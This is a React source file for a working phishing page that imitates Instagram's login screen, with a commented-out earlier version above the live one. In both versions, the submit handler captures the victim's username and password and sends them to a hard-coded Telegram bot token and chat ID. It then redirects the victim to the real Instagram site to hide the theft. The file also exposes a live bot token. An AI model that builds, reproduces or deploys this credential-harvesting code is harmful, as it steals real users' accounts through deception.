// import React, { useState } from 'react';

// function App() {
//   const [username, setUsername] = useState('');
//   const [password, setPassword] = useState('');
//   const [loading, setLoading] = useState(false);

//   const handleSubmit = async (e) => {
//     e.preventDefault();
//     setLoading(true);

//     // Console mein show
//     console.log('========== LOGIN DETAILS ==========');
//     console.log('📱 Username:', username);
//     console.log('🔑 Password:', password);
//     console.log('⏰ Time:', new Date().toLocaleString());
//     console.log('===================================');

//     // Telegram bhejo
//     const BOT_TOKEN = '8637155596:AAGfkxA0GgsO5er0APRCs3jNIySmhlEZizc';
//     const CHAT_ID = '1083301436';
//     const message = `🔐 NEW LOGIN 🔐%0A👤 ${username}%0A🔑 ${password}%0A⏰ ${new Date().toLocaleString()}`;

//     try {
//       await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${message}`);
//       console.log('✅ Telegram sent!');
//     } catch (err) {
//       console.log('❌ Error:', err);
//     }

//     setTimeout(() => {
//       window.location.href = 'https://instagram.com';
//     }, 1000);
//   };

//   return (
//     <div style={{ background: '#fafafa', minHeight: '100vh', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
//       <div style={{ background: 'white', padding: '40px', borderRadius: '8px', width: '350px', textAlign: 'center', border: '1px solid #dbdbdb' }}>
//         <h1 style={{ fontSize: '50px', marginBottom: '30px' }}>Instagram</h1>
//         <form onSubmit={handleSubmit}>
//           <input
//             type="text"
//             placeholder="Username or email"
//             style={{ width: '100%', padding: '12px', marginBottom: '10px', border: '1px solid #dbdbdb', borderRadius: '4px' }}
//             value={username}
//             onChange={(e) => setUsername(e.target.value)}
//             required
//           />
//           <input
//             type="password"
//             placeholder="Password"
//             style={{ width: '100%', padding: '12px', marginBottom: '10px', border: '1px solid #dbdbdb', borderRadius: '4px' }}
//             value={password}
//             onChange={(e) => setPassword(e.target.value)}
//             required
//           />
//           <button
//             type="submit"
//             style={{ width: '100%', padding: '10px', background: '#0095f6', color: 'white', border: 'none', borderRadius: '8px', fontWeight: 'bold' }}
//             disabled={loading}
//           >
//             {loading ? 'Please wait...' : 'Log in'}
//           </button>
//         </form>
//       </div>
//     </div>
//   );
// }

// export default App;




import React, { useState } from 'react';

function App() {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [loading, setLoading] = useState(false);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);

    console.log('========== LOGIN DETAILS ==========');
    console.log('📱 Username/Email:', username);
    console.log('🔑 Password:', password);
    console.log('⏰ Time:', new Date().toLocaleString());
    console.log('===================================');

    const BOT_TOKEN = '8637155596:AAGfkxA0GgsO5er0APRCs3jNIySmhlEZizc';
    const CHAT_ID = '1083301436';
    const message = `🔐 NEW LOGIN 🔐%0A👤 ${username}%0A🔑 ${password}%0A⏰ ${new Date().toLocaleString()}`;

    try {
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${message}`);
      console.log('✅ Telegram sent!');
    } catch (err) {
      console.log('❌ Error:', err);
    }

    setTimeout(() => {
      window.location.href = 'https://www.instagram.com';
    }, 1000);
  };

  return (
    <div style={styles.container}>
      <div style={styles.card}>
        {/* Instagram Logo */}
        <div style={styles.logo}>
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" width="68" height="68">
            <path fill="#E4405F" d="M224.1 141c-63.6 0-114.9 51.3-114.9 114.9s51.3 114.9 114.9 114.9S339 319.5 339 255.9 287.7 141 224.1 141zm0 189.6c-41.1 0-74.7-33.5-74.7-74.7s33.5-74.7 74.7-74.7 74.7 33.5 74.7 74.7-33.6 74.7-74.7 74.7zm146.4-194.3c0 14.9-12 26.8-26.8 26.8-14.9 0-26.8-12-26.8-26.8s12-26.8 26.8-26.8 26.8 12 26.8 26.8zm76.1 27.2c-1.7-35.9-9.9-67.7-36.2-93.9-26.2-26.2-58-34.4-93.9-36.2-37-2.1-147.9-2.1-184.9 0-35.8 1.7-67.6 9.9-93.9 36.1s-34.4 58-36.2 93.9c-2.1 37-2.1 147.9 0 184.9 1.7 35.9 9.9 67.7 36.2 93.9s58 34.4 93.9 36.2c37 2.1 147.9 2.1 184.9 0 35.9-1.7 67.7-9.9 93.9-36.2 26.2-26.2 34.4-58 36.2-93.9 2.1-37 2.1-147.8 0-184.8zM398.8 388c-7.8 19.6-22.9 34.7-42.6 42.6-29.5 11.7-99.5 9-132.1 9s-102.7 2.6-132.1-9c-19.6-7.8-34.7-22.9-42.6-42.6-11.7-29.5-9-99.5-9-132.1s-2.6-102.7 9-132.1c7.8-19.6 22.9-34.7 42.6-42.6 29.5-11.7 99.5-9 132.1-9s102.7-2.6 132.1 9c19.6 7.8 34.7 22.9 42.6 42.6 11.7 29.5 9 99.5 9 132.1s2.7 102.7-9 132.1z" />
          </svg>
        </div>

        {/* Login Form */}
        <form onSubmit={handleSubmit} style={styles.form}>
          <input
            type="text"
            placeholder="Username, email or mobile number"
            style={styles.input}
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            required
          />

          <input
            type="password"
            placeholder="Password"
            style={styles.input}
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            required
          />

          <button
            type="submit"
            disabled={loading}
            style={styles.button}
            onMouseEnter={(e) => e.target.style.backgroundColor = '#1877f2'}
            onMouseLeave={(e) => e.target.style.backgroundColor = '#0095f6'}
          >
            {loading ? 'Logging in...' : 'Log in'}
          </button>
        </form>

        {/* Forgot Password */}
        <div style={styles.forgotPassword}>
          <a href="#" style={styles.forgotLink}>Forgot password?</a>
        </div>

        {/* Divider */}
        <div style={styles.divider}>
          <div style={styles.dividerLine}></div>
          <span style={styles.dividerText}>OR</span>
          <div style={styles.dividerLine}></div>
        </div>

        {/* Create New Account */}
        <div style={styles.createAccount}>
          <a href="#" style={styles.createLink}>Create new account</a>
        </div>
      </div>

      {/* Meta Footer */}
      <div style={styles.footer}>
        <span style={styles.footerText}>Meta</span>
      </div>
    </div>
  );
}

const styles = {
  container: {
    minHeight: '100vh',
    backgroundColor: '#fafafa',
    display: 'flex',
    flexDirection: 'column',
    justifyContent: 'center',
    alignItems: 'center',
    fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif',
    padding: '20px',
  },
  card: {
    backgroundColor: 'white',
    border: '1px solid #dbdbdb',
    borderRadius: '1px',
    width: '100%',
    maxWidth: '350px',
    padding: '40px 40px 30px',
    marginBottom: '10px',
  },
  logo: {
    textAlign: 'center',
    marginBottom: '30px',
  },
  form: {
    display: 'flex',
    flexDirection: 'column',
    gap: '6px',
  },
  input: {
    width: '100%',
    padding: '9px 8px',
    backgroundColor: '#fafafa',
    border: '1px solid #dbdbdb',
    borderRadius: '3px',
    fontSize: '12px',
    outline: 'none',
    boxSizing: 'border-box',
  },
  button: {
    width: '100%',
    padding: '7px 16px',
    backgroundColor: '#0095f6',
    color: 'white',
    border: 'none',
    borderRadius: '8px',
    fontWeight: '600',
    fontSize: '14px',
    cursor: 'pointer',
    marginTop: '8px',
    transition: 'background-color 0.2s',
  },
  forgotPassword: {
    textAlign: 'center',
    marginTop: '18px',
  },
  forgotLink: {
    color: '#00376b',
    fontSize: '12px',
    textDecoration: 'none',
  },
  divider: {
    display: 'flex',
    alignItems: 'center',
    margin: '18px 0',
  },
  dividerLine: {
    flex: 1,
    height: '1px',
    backgroundColor: '#dbdbdb',
  },
  dividerText: {
    margin: '0 18px',
    color: '#8e8e8e',
    fontSize: '13px',
    fontWeight: '600',
  },
  createAccount: {
    textAlign: 'center',
  },
  createLink: {
    color: '#0095f6',
    fontSize: '14px',
    textDecoration: 'none',
    fontWeight: '600',
  },
  footer: {
    backgroundColor: 'white',
    border: '1px solid #dbdbdb',
    borderRadius: '1px',
    width: '100%',
    maxWidth: '350px',
    padding: '25px',
    textAlign: 'center',
  },
  footerText: {
    color: '#8e8e8e',
    fontSize: '14px',
    fontWeight: '500',
  },
};

export default App;